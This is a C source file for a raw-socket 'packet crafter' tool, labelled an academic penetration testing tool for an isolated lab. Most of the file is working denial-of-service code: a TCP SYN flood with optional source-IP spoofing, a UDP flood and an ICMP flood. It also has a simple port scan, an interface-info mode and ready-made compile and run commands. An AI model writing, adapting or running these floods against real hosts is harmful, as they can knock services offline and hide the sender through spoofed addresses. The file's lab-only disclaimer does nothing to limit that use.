/*
 * packet_crafter.c
 * BlackHunter Pro - Packet Crafter
 * Raw socket packet crafting and network analysis tool
 * Academic Penetration Testing Tool - Isolated Lab Only
 *
 * Compile: gcc -O2 -o packet_crafter packet_crafter.c
 * Usage:   ./packet_crafter <mode> <args>
 * Note:    Requires root privileges for raw sockets
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <ctype.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/time.h>

/* ============================================= */
/* CONFIGURATION */
/* ============================================= */

#define MAX_PACKET_SIZE 65535
#define DEFAULT_PAYLOAD "BlackHunter"
#define DEFAULT_TTL 64
#define DEFAULT_COUNT 5
#define DEFAULT_DELAY_US 100000 /* 100ms */

/* ============================================= */
/* GLOBAL VARIABLES */
/* ============================================= */

static volatile int g_running = 1;
static unsigned short g_checksum_seq = 0;

/* ============================================= */
/* CHECKSUM FUNCTIONS */
/* ============================================= */

static unsigned short checksum(void *data, int len) {
    unsigned short *buf = (unsigned short *)data;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }

    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;

    return result;
}

/* ============================================= */
/* PSEUDO HEADER FOR TCP/UDP CHECKSUM */
/* ============================================= */

typedef struct {
    unsigned int src_addr;
    unsigned int dst_addr;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_udp_length;
} PseudoHeader;

static unsigned short tcp_udp_checksum(struct iphdr *ip, void *data, int len, int proto) {
    PseudoHeader ps;
    char *buf;
    unsigned short result;

    ps.src_addr = ip->saddr;
    ps.dst_addr = ip->daddr;
    ps.placeholder = 0;
    ps.protocol = proto;
    ps.tcp_udp_length = htons(len);

    buf = (char *)malloc(sizeof(PseudoHeader) + len);
    if (buf == NULL) return 0;

    memcpy(buf, &ps, sizeof(PseudoHeader));
    memcpy(buf + sizeof(PseudoHeader), data, len);

    result = checksum(buf, sizeof(PseudoHeader) + len);
    free(buf);

    return result;
}

/* ============================================= */
/* RESOLVE HOST */
/* ============================================= */

static int resolve_host(const char *hostname, char *ip_out) {
    struct hostent *he;
    struct in_addr **addr_list;

    /* Check if already IP */
    struct in_addr addr;
    if (inet_aton(hostname, &addr)) {
        strcpy(ip_out, hostname);
        return 0;
    }

    he = gethostbyname(hostname);
    if (he == NULL) return -1;

    addr_list = (struct in_addr **)he->h_addr_list;
    if (addr_list[0] != NULL) {
        strcpy(ip_out, inet_ntoa(*addr_list[0]));
        return 0;
    }

    return -1;
}

/* ============================================= */
/* GET LOCAL IP */
/* ============================================= */

static int get_local_ip(const char *target_ip, char *local_ip_out) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(53);
    inet_pton(AF_INET, target_ip, &target.sin_addr);

    if (connect(sock, (struct sockaddr *)&target, sizeof(target)) < 0) {
        close(sock);
        return -1;
    }

    struct sockaddr_in local;
    socklen_t len = sizeof(local);
    if (getsockname(sock, (struct sockaddr *)&local, &len) < 0) {
        close(sock);
        return -1;
    }

    strcpy(local_ip_out, inet_ntoa(local.sin_addr));
    close(sock);
    return 0;
}

/* ============================================= */
/* BUILD IP HEADER */
/* ============================================= */

static void build_ip_header(struct iphdr *ip, const char *src_ip, const char *dst_ip,
                             int protocol, int payload_len) {
    memset(ip, 0, sizeof(struct iphdr));

    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + payload_len);
    ip->id = htons(rand() & 0xFFFF);
    ip->frag_off = 0;
    ip->ttl = DEFAULT_TTL;
    ip->protocol = protocol;
    ip->check = 0;
    ip->saddr = inet_addr(src_ip);
    ip->daddr = inet_addr(dst_ip);

    ip->check = checksum(ip, sizeof(struct iphdr));
}

/* ============================================= */
/* BUILD TCP HEADER */
/* ============================================= */

static void build_tcp_header(struct tcphdr *tcp, int src_port, int dst_port,
                              int flags, const char *payload, int payload_len) {
    memset(tcp, 0, sizeof(struct tcphdr));

    tcp->source = htons(src_port);
    tcp->dest = htons(dst_port);
    tcp->seq = htonl(rand());
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->fin = (flags & 0x01) ? 1 : 0;
    tcp->syn = (flags & 0x02) ? 1 : 0;
    tcp->rst = (flags & 0x04) ? 1 : 0;
    tcp->psh = (flags & 0x08) ? 1 : 0;
    tcp->ack = (flags & 0x10) ? 1 : 0;
    tcp->urg = (flags & 0x20) ? 1 : 0;
    tcp->window = htons(65535);
    tcp->check = 0;
    tcp->urg_ptr = 0;
}

/* ============================================= */
/* BUILD UDP HEADER */
/* ============================================= */

static void build_udp_header(struct udphdr *udp, int src_port, int dst_port,
                              const char *payload, int payload_len) {
    memset(udp, 0, sizeof(struct udphdr));

    udp->source = htons(src_port);
    udp->dest = htons(dst_port);
    udp->len = htons(sizeof(struct udphdr) + payload_len);
    udp->check = 0;
}

/* ============================================= */
/* BUILD ICMP HEADER */
/* ============================================= */

static void build_icmp_header(struct icmphdr *icmp, int type, int code,
                               const char *payload, int payload_len) {
    memset(icmp, 0, sizeof(struct icmphdr));

    icmp->type = type;
    icmp->code = code;
    icmp->un.echo.id = htons(getpid() & 0xFFFF);
    icmp->un.echo.sequence = htons(g_checksum_seq++);
    icmp->checksum = 0;

    if (payload != NULL && payload_len > 0) {
        memcpy((void *)icmp + sizeof(struct icmphdr), payload, payload_len);
    }

    icmp->checksum = checksum(icmp, sizeof(struct icmphdr) + payload_len);
}

/* ============================================= */
/* SEND PACKET */
/* ============================================= */

static int send_raw_packet(int sock, const char *dst_ip, void *packet, int packet_len) {
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = inet_addr(dst_ip);

    int result = sendto(sock, packet, packet_len, 0,
                        (struct sockaddr *)&dst, sizeof(dst));

    return result;
}

/* ============================================= */
/* TCP SYN FLOOD (Educational) */
/* ============================================= */

static void tcp_syn_flood(const char *target_ip, int target_port,
                           int count, int delay_us, const char *spoof_ip) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        fprintf(stderr, "\033[1;31m[!] Cannot create raw socket (need root): %s\033[0m\n",
                strerror(errno));
        return;
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "\033[1;31m[!] Cannot set IP_HDRINCL: %s\033[0m\n", strerror(errno));
        close(sock);
        return;
    }

    char source_ip[64];
    if (spoof_ip != NULL) {
        strncpy(source_ip, spoof_ip, sizeof(source_ip) - 1);
    } else {
        get_local_ip(target_ip, source_ip);
    }

    printf("\033[1;36m[*] Source IP: %s\033[0m\n", source_ip);
    printf("\033[1;36m[*] Target:    %s:%d\033[0m\n", target_ip, target_port);
    printf("\033[1;36m[*] Count:     %d\033[0m\n\n", count);

    char packet[MAX_PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    const char *payload = "";
    int payload_len = 0;

    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);

    for (int i = 0; i < count && g_running; i++) {
        /* Build IP header */
        build_ip_header(ip, source_ip, target_ip, IPPROTO_TCP,
                        sizeof(struct tcphdr) + payload_len);

        /* Build TCP header with SYN flag */
        build_tcp_header(tcp, 1024 + (rand() % 60000), target_port, 0x02,
                         payload, payload_len);

        /* Compute TCP checksum */
        tcp->check = tcp_udp_checksum(ip, tcp, sizeof(struct tcphdr) + payload_len, IPPROTO_TCP);

        int packet_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;

        /* Send packet */
        send_raw_packet(sock, target_ip, packet, packet_len);

        if (i % 100 == 0 && i > 0) {
            printf("\r\033[1;33m[*] Sent: %d/%d packets\033[0m", i, count);
            fflush(stdout);
        }

        if (delay_us > 0) usleep(delay_us);
    }

    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;

    printf("\r\033[1;32m[+] Sent: %d/%d packets in %.2f seconds (%.0f pps)\033[0m\n",
           count, count, elapsed, count / elapsed);

    close(sock);
}

/* ============================================= */
/* UDP PACKET FLOOD */
/* ============================================= */

static void udp_flood(const char *target_ip, int target_port,
                       int count, int delay_us) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        fprintf(stderr, "\033[1;31m[!] Cannot create raw socket (need root): %s\033[0m\n",
                strerror(errno));
        return;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char source_ip[64];
    get_local_ip(target_ip, source_ip);

    printf("\033[1;36m[*] Source IP: %s\033[0m\n", source_ip);
    printf("\033[1;36m[*] Target:    %s:%d\033[0m\n", target_ip, target_port);
    printf("\033[1;36m[*] Count:     %d\033[0m\n\n", count);

    char packet[MAX_PACKET_SIZE];
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));

    const char *payload = "BlackHunter-UDD-Flood-Payload";
    int payload_len = strlen(payload);

    for (int i = 0; i < count && g_running; i++) {
        /* Build IP header */
        build_ip_header(ip, source_ip, target_ip, IPPROTO_UDP,
                        sizeof(struct udphdr) + payload_len);

        /* Build UDP header */
        build_udp_header(udp, 1024 + (rand() % 60000), target_port, payload, payload_len);

        /* Add payload */
        memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), payload, payload_len);

        /* Compute UDP checksum */
        udp->check = tcp_udp_checksum(ip, udp, sizeof(struct udphdr) + payload_len, IPPROTO_UDP);

        int packet_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;

        send_raw_packet(sock, target_ip, packet, packet_len);

        if (i % 100 == 0 && i > 0) {
            printf("\r\033[1;33m[*] Sent: %d/%d packets\033[0m", i, count);
            fflush(stdout);
        }

        if (delay_us > 0) usleep(delay_us);
    }

    printf("\r\033[1;32m[+] Sent: %d packets\033[0m\n", count);

    close(sock);
}

/* ============================================= */
/* ICMP FLOOD */
/* ============================================= */

static void icmp_flood(const char *target_ip, int count, int delay_us, int payload_size) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        fprintf(stderr, "\033[1;31m[!] Cannot create raw socket (need root): %s\033[0m\n",
                strerror(errno));
        return;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char source_ip[64];
    get_local_ip(target_ip, source_ip);

    printf("\033[1;36m[*] Source IP: %s\033[0m\n", source_ip);
    printf("\033[1;36m[*] Target:    %s\033[0m\n", target_ip);
    printf("\033[1;36m[*] Count:     %d\033[0m\n\n", count);

    char packet[MAX_PACKET_SIZE];
    struct iphdr *ip = (struct iphdr *)packet;
    struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));

    /* Payload */
    char *payload = (char *)malloc(payload_size);
    if (payload == NULL) {
        close(sock);
        return;
    }
    memset(payload, 'A', payload_size);

    for (int i = 0; i < count && g_running; i++) {
        /* Build IP header */
        build_ip_header(ip, source_ip, target_ip, IPPROTO_ICMP,
                        sizeof(struct icmphdr) + payload_size);

        /* Build ICMP header (Echo Request) */
        build_icmp_header(icmp, ICMP_ECHO, 0, payload, payload_size);

        int packet_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_size;

        send_raw_packet(sock, target_ip, packet, packet_len);

        if (i % 100 == 0 && i > 0) {
            printf("\r\033[1;33m[*] Sent: %d/%d packets\033[0m", i, count);
            fflush(stdout);
        }

        if (delay_us > 0) usleep(delay_us);
    }

    printf("\r\033[1;32m[+] Sent: %d ICMP packets\033[0m\n", count);

    free(payload);
    close(sock);
}

/* ============================================= */
/* TCP CONNECT SCAN (via raw) */
/* ============================================= */

static void tcp_scan_port(const char *target_ip, int target_port, int timeout_ms) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target.sin_addr);

    int result = connect(sock, (struct sockaddr *)&target, sizeof(target));

    if (result == 0) {
        printf("\033[1;32m[+] Port %d: OPEN\033[0m\n", target_port);
    } else if (errno == ECONNREFUSED) {
        printf("\033[1;31m[+] Port %d: CLOSED\033[0m\n", target_port);
    } else {
        printf("\033[1;33m[+] Port %d: FILTERED\033[0m\n", target_port);
    }

    close(sock);
}

/* ============================================= */
/* ARP SCAN (Simple) */
/* ============================================= */

static void arp_scan(const char *interface) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        fprintf(stderr, "\033[1;31m[!] Cannot get IP for %s\033[0m\n", interface);
        close(sock);
        return;
    }

    struct sockaddr_in *addr = (struct sockaddr_in *)&ifr.ifr_addr;
    printf("\033[1;36m[*] Interface: %s\033[0m\n", interface);
    printf("\033[1;36m[*] Local IP:  %s\033[0m\n", inet_ntoa(addr->sin_addr));

    if (ioctl(sock, SIOCGIFNETMASK, &ifr) < 0) {
        close(sock);
        return;
    }

    addr = (struct sockaddr_in *)&ifr.ifr_netmask;
    printf("\033[1;36m[*] Netmask:   %s\033[0m\n", inet_ntoa(addr->sin_addr));

    close(sock);
}

/* ============================================= */
/* PRINT BANNER */
/* ============================================= */

static void print_banner(void) {
    printf("\n");
    printf("\033[1;31m");
    printf("  ██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗    ██████╗██████╗  █████╗ ███████╗████████╗\n");
    printf("  ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝   ██╔════╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝\n");
    printf("  ██████╔╝███████║██║     █████╔╝ █████╗     ██║      ██║     ██████╔╝███████║█████╗     ██║   \n");
    printf("  ██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║      ██║     ██╔══██╗██╔══██║██╔══╝     ██║   \n");
    printf("  ██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║      ╚██████╗██║  ██║██║  ██║██║        ██║   \n");
    printf("  ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝   \n");
    printf("\033[0m");
    printf("\033[1;36m");
    printf("                        Packet Crafter v1.0\n");
    printf("                  Academic Penetration Testing Tool\n");
    printf("\033[0m\n");
}

/* ============================================= */
/* PRINT USAGE */
/* ============================================= */

static void print_usage(const char *prog) {
    printf("BlackHunter Pro - Packet Crafter\n");
    printf("Usage: %s <mode> <args>\n\n", prog);
    printf("\033[1;36mModes:\033[0m\n");
    printf("  syn <target> <port> [count] [delay_us] [spoof_ip]  - TCP SYN packets\n");
    printf("  udp <target> <port> [count] [delay_us]             - UDP flood\n");
    printf("  icmp <target> [count] [delay_us] [payload_size]    - ICMP flood\n");
    printf("  scan <target> <port> [timeout_ms]                  - TCP port scan\n");
    printf("  info <interface>                                   - Show interface info\n");
    printf("\n");
    printf("\033[1;36mExamples:\033[0m\n");
    printf("  %s syn 192.168.1.1 80 100 1000\n", prog);
    printf("  %s udp 192.168.1.1 53 50 5000\n", prog);
    printf("  %s icmp 192.168.1.1 100 1000 64\n", prog);
    printf("  %s scan 192.168.1.1 443\n", prog);
    printf("  %s info wlan0\n", prog);
    printf("\n");
    printf("\033[1;33m[!] Raw socket modes require root privileges\033[0m\n");
    printf("\n");
}

/* ============================================= */
/* SIGNAL HANDLER */
/* ============================================= */

static void signal_handler(int sig) {
    (void)sig;
    g_running = 0;
    printf("\n\033[1;33m[!] Interrupted\033[0m\n");
}

/* ============================================= */
/* MAIN */
/* ============================================= */

int main(int argc, char *argv[]) {
    print_banner();

    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    /* Seed random */
    srand(time(NULL) ^ getpid());

    const char *mode = argv[1];
    char target_ip[64];

    /* SYNC FLOOD */
    if (strcmp(mode, "syn") == 0) {
        if (argc < 4) {
            fprintf(stderr, "\033[1;31m[!] Usage: %s syn <target> <port> [count] [delay_us] [spoof_ip]\033[0m\n", argv[0]);
            return 1;
        }

        if (resolve_host(argv[2], target_ip) < 0) {
            fprintf(stderr, "\033[1;31m[!] Cannot resolve: %s\033[0m\n", argv[2]);
            return 1;
        }

        int port = atoi(argv[3]);
        int count = (argc >= 5) ? atoi(argv[4]) : DEFAULT_COUNT;
        int delay = (argc >= 6) ? atoi(argv[5]) : DEFAULT_DELAY_US;
        const char *spoof = (argc >= 7) ? argv[6] : NULL;

        tcp_syn_flood(target_ip, port, count, delay, spoof);
    }
    /* UDP FLOOD */
    else if (strcmp(mode, "udp") == 0) {
        if (argc < 4) {
            fprintf(stderr, "\033[1;31m[!] Usage: %s udp <target> <port> [count] [delay_us]\033[0m\n", argv[0]);
            return 1;
        }

        if (resolve_host(argv[2], target_ip) < 0) {
            fprintf(stderr, "\033[1;31m[!] Cannot resolve: %s\033[0m\n", argv[2]);
            return 1;
        }

        int port = atoi(argv[3]);
        int count = (argc >= 5) ? atoi(argv[4]) : DEFAULT_COUNT;
        int delay = (argc >= 6) ? atoi(argv[5]) : DEFAULT_DELAY_US;

        udp_flood(target_ip, port, count, delay);
    }
    /* ICMP FLOOD */
    else if (strcmp(mode, "icmp") == 0) {
        if (argc < 3) {
            fprintf(stderr, "\033[1;31m[!] Usage: %s icmp <target> [count] [delay_us] [payload_size]\033[0m\n", argv[0]);
            return 1;
        }

        if (resolve_host(argv[2], target_ip) < 0) {
            fprintf(stderr, "\033[1;31m[!] Cannot resolve: %s\033[0m\n", argv[2]);
            return 1;
        }

        int count = (argc >= 4) ? atoi(argv[3]) : DEFAULT_COUNT;
        int delay = (argc >= 5) ? atoi(argv[4]) : DEFAULT_DELAY_US;
        int size = (argc >= 6) ? atoi(argv[5]) : 56;

        icmp_flood(target_ip, count, delay, size);
    }
    /* TCP PORT SCAN */
    else if (strcmp(mode, "scan") == 0) {
        if (argc < 4) {
            fprintf(stderr, "\033[1;31m[!] Usage: %s scan <target> <port> [timeout_ms]\033[0m\n", argv[0]);
            return 1;
        }

        if (resolve_host(argv[2], target_ip) < 0) {
            fprintf(stderr, "\033[1;31m[!] Cannot resolve: %s\033[0m\n", argv[2]);
            return 1;
        }

        int port = atoi(argv[3]);
        int timeout = (argc >= 5) ? atoi(argv[4]) : 3000;

        printf("\033[1;36m[*] Scanning %s:%d...\033[0m\n", target_ip, port);
        tcp_scan_port(target_ip, port, timeout);
    }
    /* INTERFACE INFO */
    else if (strcmp(mode, "info") == 0) {
        if (argc < 3) {
            fprintf(stderr, "\033[1;31m[!] Usage: %s info <interface>\033[0m\n", argv[0]);
            return 1;
        }
        arp_scan(argv[2]);
    }
    /* HELP */
    else if (strcmp(mode, "help") == 0 || strcmp(mode, "-h") == 0) {
        print_usage(argv[0]);
    }
    /* UNKNOWN */
    else {
        fprintf(stderr, "\033[1;31m[!] Unknown mode: %s\033[0m\n", mode);
        print_usage(argv[0]);
        return 1;
    }

    printf("\n\033[1;32m[+] Done!\033[0m\n\n");
    return 0;
}

/* ============================================= */
/* COMPILE INSTRUCTIONS */
/* ============================================= */

/*
 * Compile:
 *   gcc -O2 -o packet_crafter packet_crafter.c
 *   clang -O2 -o packet_crafter packet_crafter.c
 *
 * Run (requires root):
 *   sudo ./packet_crafter syn 192.168.1.1 80 100 1000
 *   sudo ./packet_crafter udp 192.168.1.1 53 50 5000
 *   sudo ./packet_crafter icmp 192.168.1.1 100 1000 64
 *   ./packet_crafter scan 192.168.1.1 443
 *   ./packet_crafter info wlan0
 */